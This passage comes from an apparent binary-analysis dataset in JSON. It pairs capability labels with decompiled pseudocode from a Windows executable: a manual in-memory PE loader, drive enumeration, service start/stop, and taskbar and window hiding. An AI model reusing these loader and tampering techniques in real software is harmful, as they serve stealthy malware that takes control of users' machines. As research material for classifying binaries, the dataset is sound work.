= 0;\n    uVar1 = fcn.0042ed68(0, 0x464104, 0, 0);\n    *(in_EAX + 0x1c50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 484
    },
    "00465994": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00465994(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *arg_8h;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *in_stack_fffffe7c;\n    int32_t *piStack348;\n    uint uStack344;\n    uchar *puStack340;\n    int32_t var_140h;\n    uint32_t lpAddress;\n    uint dwSize;\n    uint var_ech;\n    uint var_48h;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack340 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack344 = 0x465c0f;\n    piStack348 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack348;\n    fcn.00408568();\n    if (var_48h == 0x5a4d) {\n        piVar6 = var_ch;\n        fcn.0046523c(var_ch, var_ch >> 0x1f);\n        fcn.00408568();\n        if (var_140h == 0x4550) {\n            uVar2 = sub.kernel32.dll_VirtualAlloc_1(lpAddress, dwSize, 0x2000, 4);\n            if (uVar2 == 0) {\n                in_stack_fffffe7c = NULL;\n                uVar2 = sub.kernel32.dll_VirtualAlloc_1(0, dwSize, 0x2000, 4);\n            }\n            if (uVar2 == 0) {\n                fcn.00405584();\n                *in_FS_OFFSET = in_stack_fffffe7c;\n            }\n            else {\n                uVar3 = sub.kernel32.dll_GetProcessHeap(0, 0x11);\n                arg_8h = sub.kernel32.dll_HeapAlloc(uVar3);\n                arg_8h[1] = uVar2;\n                arg_8h[3] = 0;\n                arg_8h[2] = 0;\n                *(arg_8h + 4) = 0;\n                sub.kernel32.dll_VirtualAlloc_1(uVar2, dwSize, 0x1000, 4);\n                iVar4 = sub.kernel32.dll_VirtualAlloc_1(uVar2, var_ech, 0x1000, 4);\n                fcn.00408568();\n                *arg_8h = var_ch + iVar4;\n                *(var_ch + iVar4 + 0x34) = uVar2;\n                fcn.00465330();\n                piVar6 = uVar2 - lpAddress;\n                piVar7 = piVar6;\n                piVar8 = -(uVar2 < lpAddress);\n                if (piVar6 != NULL) {\n                    piVar7 = arg_8h;\n                    fcn.00465434(arg_8h, piVar6);\n                    piVar8 = piVar6;\n                }\n                piVar6 = arg_8h;\n                cVar1 = fcn.00465520(arg_8h);\n                if (cVar1 == '\\0') {\n                    fcn.00405818(piVar6, piVar7, piVar8);\n                    fcn.00465fc0();\n                    *in_FS_OFFSET = piVar6;\n                }\n                else {\n                    piVar6 = arg_8h;\n                    fcn.0046587c(arg_8h);\n                    if (*(*arg_8h + 0x28) != 0) {\n                        pcVar5 = *(*arg_8h + 0x28) + uVar2;\n                        if (pcVar5 == NULL) {\n                            fcn.00405584();\n                            fcn.00465fc0();\n                            *in_FS_OFFSET = piVar6;\n                            return NULL;\n                        }\n                        iVar4 = (*pcVar5)(uVar2, 1, 0);\n                        if (iVar4 == 0) {\n                            fcn.00405584();\n                            fcn.00465fc0();\n                            *in_FS_OFFSET = piVar6;\n                            return NULL;\n                        }\n                        *(arg_8h + 4) = 1;\n                    }\n                    *in_FS_OFFSET = piVar6;\n                    var_4h = arg_8h;\n                }\n            }\n        }\n        else {\n            fcn.00405584();\n            *in_FS_OFFSET = piVar6;\n        }\n    }\n    else {\n        fcn.00405584();\n        *in_FS_OFFSET = piStack348;\n    }\n    return var_4h;\n}\n",
        "token_count": 1067
    },
    "00466c64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466c64(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack300;\n    \n    iVar1 = fcn.00460cc4();\n    if ((iVar1 != -1) && (iVar1 = fcn.00460ce4(0x128),  iVar1 != 0)) {\n        while (iVar1 = fcn.00460d04(),  iVar1 != 0) {\n            if (in_EAX == iStack300) {\n                fcn.004057a0();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00467904": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00467904(uint32_t param_1, uint8_t *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    \n    uVar18 = in_EAX >> 0x10;\n    uVar2 = in_EAX & 0xffff;\n    if (param_1 == 1) {\n        uVar2 = uVar2 + *param_2;\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar18 = uVar18 + uVar2;\n        if (0xfff0 < uVar18) {\n            uVar18 = uVar18 - 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    else if (param_2 == NULL) {\n        uVar2 = 1;\n    }\n    else if (param_1 < 0x10) {\n        while (param_1 != 0) {\n            uVar2 = uVar2 + *param_2;\n            param_2 = param_2 + 1;\n            uVar18 = uVar18 + uVar2;\n            param_1 = param_1 - 1;\n        }\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar2 = uVar18 % 0xfff1 << 0x10 | uVar2;\n    }\n    else {\n        if (0x15af < param_1) {\n            do {\n                param_1 = param_1 - 0x15b0;\n                iVar1 = 0x15b;\n                do {\n                    iVar3 = uVar2 + *param_2;\n                    iVar4 = iVar3 + param_2[1];\n                    iVar5 = iVar4 + param_2[2];\n                    iVar6 = iVar5 + param_2[3];\n                    iVar7 = iVar6 + param_2[4];\n                    iVar8 = iVar7 + param_2[5];\n                    iVar9 = iVar8 + param_2[6];\n                    iVar10 = iVar9 + param_2[7];\n                    iVar11 = iVar10 + param_2[8];\n                    iVar12 = iVar11 + param_2[9];\n                    iVar13 = iVar12 + param_2[10];\n                    iVar14 = iVar13 + param_2[0xb];\n                    iVar15 = iVar14 + param_2[0xc];\n                    iVar16 = iVar15 + param_2[0xd];\n                    iVar17 = iVar16 + param_2[0xe];\n                    uVar2 = iVar17 + param_2[0xf];\n                    uVar18 = uVar18 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                             iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;\n                    param_2 = param_2 + 0x10;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n                uVar2 = uVar2 % 0xfff1;\n                uVar18 = uVar18 % 0xfff1;\n            } while (0x15af < param_1);\n        }\n        if (param_1 != 0) {\n            for (; 0xf < param_1; param_1 = param_1 - 0x10) {\n                iVar1 = uVar2 + *param_2;\n                iVar3 = iVar1 + param_2[1];\n                iVar4 = iVar3 + param_2[2];\n                iVar5 = iVar4 + param_2[3];\n                iVar6 = iVar5 + param_2[4];\n                iVar7 = iVar6 + param_2[5];\n                iVar8 = iVar7 + param_2[6];\n                iVar9 = iVar8 + param_2[7];\n                iVar10 = iVar9 + param_2[8];\n                iVar11 = iVar10 + param_2[9];\n                iVar12 = iVar11 + param_2[10];\n                iVar13 = iVar12 + param_2[0xb];\n                iVar14 = iVar13 + param_2[0xc];\n                iVar15 = iVar14 + param_2[0xd];\n                iVar16 = iVar15 + param_2[0xe];\n                uVar2 = iVar16 + param_2[0xf];\n                uVar18 = uVar18 + iVar1 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +\n                         iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + uVar2;\n                param_2 = param_2 + 0x10;\n            }\n            while (param_1 != 0) {\n                uVar2 = uVar2 + *param_2;\n                param_2 = param_2 + 1;\n                uVar18 = uVar18 + uVar2;\n                param_1 = param_1 - 1;\n            }\n            uVar2 = uVar2 % 0xfff1;\n            uVar18 = uVar18 % 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 1302
    },
    "004686d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004686d8(uint32_t param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    arg_10h = in_EAX[1];\n    if (param_1 < in_EAX[1]) {\n        arg_10h = param_1;\n    }\n    if (arg_10h == 0) {\n        arg_10h = 0;\n    }\n    else {\n        in_EAX[1] = in_EAX[1] - arg_10h;\n        if (*(in_EAX[7] + 0x18) == 1) {\n            iVar1 = fcn.00467904();\n            in_EAX[0xc] = iVar1;\n        }\n        fcn.00467658(param_2, *in_EAX, arg_10h);\n        *in_EAX = *in_EAX + arg_10h;\n        in_EAX[2] = in_EAX[2] + arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 248
    },
    "0046cff8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046d01f)\n\nint32_t __cdecl fcn.0046cff8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    iVar1 = fcn.00467c0c(0x38);\n    if (iVar1 == 0) {\n        iVar1 = fcn.004681c8();\n        if (iVar1 == 1) {\n            *in_EDX = var_28h;\n            iVar1 = fcn.0046848c();\n        }\n        else {\n            fcn.0046848c();\n            if (iVar1 == 0) {\n                iVar1 = -5;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 234
    },
    "0046d970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0046d970(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x46dab1;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046d970::var_24h;\n    cVar3 = 'A';\n    var_10h = unaff_EBX;\n    do {\n        fcn.00405718();\n        fcn.00405818();\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.kernel32.dll_GetDriveTypeA(uVar1);\n        uVar4 = iVar2 == 1;\n        if (1 < iVar2) {\n            fcn.0048a580();\n            fcn.0040a5dc();\n            fcn.00409b84();\n            var_24h = CONCAT31(CONCAT21(var_24h._2_2_, cVar3), 1);\n            fcn.004039a0(var_10h);\n            fcn.00403970();\n            fcn.00405794();\n            fcn.00409b84();\n            fcn.00405974();\n            if (uVar4) {\n                fcn.004055c8();\n            }\n            else {\n                fcn.004055c8();\n            }\n            uVar1 = var_4h;\n            fcn.00405718(var_4h);\n            fcn.004058e0(0x46daf8, var_8h, 0x46daec, 0x46dac8, uVar1);\n        }\n        cVar3 = cVar3 + '\\x01';\n    } while (cVar3 != '[');\n    fcn.00405584();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x46dab8;\n    var_20h = 0x46daa3;\n    fcn.00405530();\n    var_20h = 0x46dab0;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 691
    },
    "0046db2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0046db2c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 65
    },
    "0046db48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0046db48(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar1 = fcn.004059dc(uVar1);\n    iVar2 = sub.kernel32.dll_MoveFileA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 77
    },
    "0046df20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046df20(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack592;\n    uint uStack588;\n    uchar *puStack584;\n    uint var_234h;\n    uint var_230h;\n    uint var_218h;\n    uint var_110h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack584 = &stack0xfffffffc;\n    uStack588 = 0x46e039;\n    uStack592 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdb0;\n    fcn.00405530();\n    uVar1 = fcn.00460cc4();\n    iVar2 = fcn.00460d24();\n    while (iVar2 != 0) {\n        fcn.00409e8c();\n        uVar4 = 0;\n        uVar3 = var_218h;\n        fcn.00409eb4(var_218h);\n        fcn.004057a0(0, uVar3, uVar4);\n        uStack592 = 0x46e074;\n        fcn.004058e0();\n        iVar2 = fcn.00460d44();\n    }\n    sub.kernel32.dll_CloseHandle_1();\n    fcn.00405584();\n    *in_FS_OFFSET = uVar1;\n    uStack588 = 0x46e040;\n    uStack592 = 0x46e02b;\n    fcn.00405530();\n    uStack592 = 0x46e038;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 380
    },
    "0046ebd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __fastcall fcn.0046ebd4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_150h;\n    uchar *var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    iVar2 = 0x29;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_10h = NULL;\n    puStack36 = 0x46ebfc;\n    var_1ch = unaff_EDI;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack36 = 0x46ec04;\n    fcn.004059cc();\n    uStack40 = 0x46ef3e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x46ec1a;\n    puStack36 = &stack0xfffffffc;\n    fcn.00405530();\n    puStack48 = 0x46ec26;\n    var_14h = fcn.00421670();\n    puStack48 = 0x46ec35;\n    var_18h = fcn.00404620();\n    puStack48 = 0x46ec40;\n    fcn.00409ee4();\n    puStack48 = 0x46ec45;\n    fcn.0046eac8();\n    uStack52 = 0x46ef02;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x46eef1;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421e4c();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            var_1ch = iVar2;\n            (**(*var_18h + 0xc))();\n            cVar1 = fcn.00421f8c();\n            if (cVar1 == '\\x01') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x46ef64, var_ch, 0x46ef64, var_124h);\n                uStack64 = 0x46ed18;\n                fcn.00422014();\n                uStack64 = var_128h;\n                uStack68 = 0x46ef70;\n                fcn.004058e0();\n            }\n            else if (cVar1 == '\\x03') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x46ef64, var_ch, 0x46ef64, var_130h);\n                uStack64 = 0x46ed8d;\n                fcn.004220a0();\n                uStack64 = 0x46ed98;\n                fcn.00409d78();\n                uStack64 = var_134h;\n                uStack68 = 0x46ef70;\n                fcn.004058e0();\n            }\n            else if (cVar1 == '\\x02') {\n                fcn.004055c8();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x46ef64, var_ch, 0x46ef64, var_13ch);\n                uStack64 = 0x46ee10;\n                fcn.00422014();\n                uStack64 = var_140h;\n                uStack68 = 0x46ef70;\n                fcn.004058e0();\n            }\n            if (cVar1 == '\\x04') {\n                arg_8h = 0x100;\n                (**(*var_18h + 0xc))();\n                iVar2 = fcn.004220d0(arg_8h);\n                if (0 < iVar2) {\n                    fcn.004055c8();\n                }\n                (**(*var_18h + 0xc))(*var_10h);\n                puStack48 = var_14ch;\n                uStack52 = 0x46ef64;\n                uStack56 = var_ch;\n                puStack60 = 0x46ef64;\n                uStack64 = 0x46eea9;\n                fcn.004057a0();\n                uStack64 = var_150h;\n                uStack68 = 0x46ef70;\n                fcn.004058e0();\n            }\n            var_1ch = var_1ch + -1;\n            iVar2 = var_1ch;\n        } while (var_1ch != 0);\n    }\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x46eef8;\n    uStack64 = 0x46eee0;\n    fcn.0042171c();\n    uStack64 = 0x46eee8;\n    fcn.00404650();\n    uStack64 = 0x46eef0;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 1478
    },
    "004701f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004701f4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.004701f4::var_1h + 1;\n    puStack44 = &fcn.004701f4::var_1h + 1;\n    uStack36 = 0x470280;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    var_1h._0_1_ = 0;\n    uStack48 = 0x470259;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    fcn.0045ea60(&fcn.004701f4::var_8h);\n    (**(_pe_dos_header + 0x78))();\n    fcn.0040711c();\n    if (var_8h == -2) {\n        var_1h._0_1_ = 0;\n    }\n    *in_FS_OFFSET = 0;\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x470287;\n    puStack44 = 0x47027f;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 355
    },
    "00470ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00470ff0(void)\n\n{\n    char in_AL;\n    \n    fcn.00421670();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421890();\n    fcn.00421890();\n    fcn.00421890();\n    fcn.00421890();\n    fcn.00421890();\n    if (in_AL == '\\x01') {\n        fcn.00421fb4();\n    }\n    else if (in_AL == '\\0') {\n        fcn.00421cfc();\n    }\n    fcn.0042171c();\n    return;\n}\n",
        "token_count": 140
    },
    "0047112c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "find graphical window",
            "find taskbar"
        ],
        "decompiled_code": "\nvoid fcn.0047112c(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    \n    if (in_AL == '\\x01') {\n        uVar1 = sub.user32.dll_FindWindowA(0x471184, 0, 0, 0x47117c, 0, 0xffffffff);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n        return;\n    }\n    if (in_AL == '\\0') {\n        uVar1 = sub.user32.dll_FindWindowA(0x471184, 0, 0, 0x47117c, 0, 0);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0047120c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047120c(void)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iVar4;\n    int32_t iStack160;\n    uint uStack156;\n    uchar *puStack152;\n    uint var_88h;\n    uint lpClassName;\n    uint var_4h;\n    \n    puStack152 = &stack0xfffffffc;\n    uStack156 = 0x4712d6;\n    iStack160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack160;\n    iVar1 = sub.user32.dll_FindWindowA(0x4712e4, 0);\n    iVar2 = sub.user32.dll_GetWindow(iVar1, 5);\n    while (iVar4 = iVar2,  iVar4 != 0) {\n        iVar1 = iVar4;\n        iVar2 = sub.user32.dll_GetClassNameA();\n        uVar3 = iVar2 == 0;\n        if (0 < iVar2) {\n            fcn.0040aab0();\n            fcn.004097e4();\n            fcn.00405974();\n            if (uVar3) {\n                if (in_AL == '\\x01') {\n                    iVar1 = iVar4;\n                    sub.user32.dll_ShowWindow();\n                }\n                else {\n                    iVar1 = iVar4;\n                    sub.user32.dll_ShowWindow();\n                }\n            }\n        }\n        iVar2 = sub.user32.dll_GetWindow(iVar4, 2, iVar1);\n        iVar1 = iVar4;\n    }\n    *in_FS_OFFSET = iVar1;\n    fcn.00405530(0x4712dd);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 384
    },
    "004715d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004715d4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY124;\n    int32_t iStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint lpServiceStatus;\n    uint var_28h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack64 = 0x4715f1;\n    var_8h = in_EDX;\n    fcn.004059cc();\n    uStack68 = 0x4716ba;\n    iStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.00405530();\n    var_28h = 0;\n    var_10h = 0;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        if (var_ch == 0) {\n            uVar4 = 0x20;\n        }\n        else {\n            uVar4 = 0x10;\n        }\n        uVar2 = fcn.004059dc(uVar4 | 4);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            if (var_8h != 0) {\n                if (var_ch == 0) {\n                    sub.advapi32.dll_ControlService(iVar3, 1, &fcn.004715d4::lpServiceStatus);\n                }\n                else {\n                    sub.advapi32.dll_StartServiceA(iVar3, 0, &fcn.004715d4::var_10h);\n                }\n            }\n            sub.advapi32.dll_QueryServiceStatus(iVar3, &fcn.004715d4::lpServiceStatus);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY124 = iVar1;\n    }\n    fcn.0047149c();\n    *in_FS_OFFSET = iStackY124;\n    fcn.00405530(0x4716c1);\n    return;\n}\n",
        "token_count": 547
    },
    "00474d5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00474d5c(void)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.00474a94();\n        iVar2 = iVar2 + iVar1;\n        if ((iVar1 == 1) && (*in_EAX == -0x3d)) break;\n        in_EAX = in_EAX + iVar1;\n        if (iVar1 == 0) {\n            return iVar2;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 132
    },
    "00475980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00475980(void)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack40 = &fcn.00475980::var_1h + 1;\n    puStack52 = &fcn.00475980::var_1h + 1;\n    uStack44 = 0x475b1e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x475aef;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    while( true ) {\n        puStack64 = 0x4759c7;\n        iVar2 = fcn.00484a2c();\n        if (iVar2 < 1) break;\n        puStack64 = 0x4759b8;\n        fcn.00484a2c();\n        puStack64 = 0x4759bd;\n        fcn.00484e64();\n    }\n    while( true ) {\n        puStack64 = 0x4759e6;\n        iVar2 = fcn.00484a2c();\n        uVar3 = iVar2 == 0;\n        if (iVar2 < 1) break;\n        puStack64 = 0x4759d7;\n        fcn.00484a2c();\n        puStack64 = 0x4759dc;\n        fcn.00484e64();\n    }\n    puStack64 = 0x4759f7;\n    fcn.00473610();\n    puStack64 = 